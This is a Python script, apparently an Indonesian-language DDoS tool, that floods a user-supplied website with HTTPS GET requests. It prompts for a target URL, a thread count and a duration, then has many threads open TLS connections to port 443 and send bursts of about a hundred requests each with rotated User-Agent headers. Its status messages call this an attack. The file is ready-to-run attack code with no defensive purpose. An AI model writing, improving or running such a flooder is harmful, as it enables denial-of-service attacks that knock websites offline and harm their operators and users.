import os
import subprocess
import sys
import threading
import requests
import datetime
import time
import socket
import ssl
import random
from urllib.parse import urlparse
from sys import stdout
from colorama import Fore, init
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup

# Daftar modul yang diperlukan
required_modules = [
    "requests",
    "colorama",
    "rich",
    "beautifulsoup4"
]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Modul '{module}' tidak ditemukan. Menginstal...")
            install(module)

# Panggil fungsi untuk memeriksa dan menginstal modul
check_and_install_modules()

# Banner and console setup
console = Console()

# Colors
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING

# Clear console
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Main command function
def command():
    try:
        target = console.input(f' {H2}• {K2}URL :{H2} ')
        thread = int(console.input(f' {H2}• {K2}JUMLAH THREAD :{H2} '))
        t = int(console.input(f' {H2}• {K2}WAKTU (detik) :{H2} '))
        
        # Validate inputs
        if not target or thread <= 0 or t <= 0:
            console.print(f"{M2}Input tidak valid, coba lagi.", style="bold red")
            return

        # Start attack and countdown
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        countdown_thread = threading.Thread(target=countdown, args=(t,))
        countdown_thread.start()
        countdown_thread.join()
    except ValueError:
        console.print(f"{M2}Input angka tidak valid.", style="bold red")

# Attack function
def attackSTELLAR(url, timer, threads):
    for _ in range(threads):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

# Attack process
def LaunchSTELLAR(url, timer):
    end_time = time.time() + timer
    req = (
        f"GET / HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\n"
        "Cache-Control: no-cache\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Sec-Fetch-Site: same-origin\r\n"
        "Sec-GPC: 1\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: Keep-Alive\r\n\r\n"
    )
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((urlparse(url).netloc, 443))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(req.encode())
            try:
                for _ in range(100):
                    s.send(req.encode())
            except Exception as e:
                console.print(f"{M2}Terjadi kesalahan saat mengirim permintaan: {e}", style="bold red")
            finally:
                s.close()
        except Exception as e:
            console.print(f"{M2}Kesalahan koneksi: {e}", style="bold red")

# Countdown function
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=t)
    while True:
        remaining_time = (until - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Status serangan => {remaining_time:.2f} detik tersisa ")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Serangan selesai!\n")
            return

# Entry point
if __name__ == '__main__':
    init(convert=True)
    ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
          "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"]
    
    clear()
    while True:
        command()
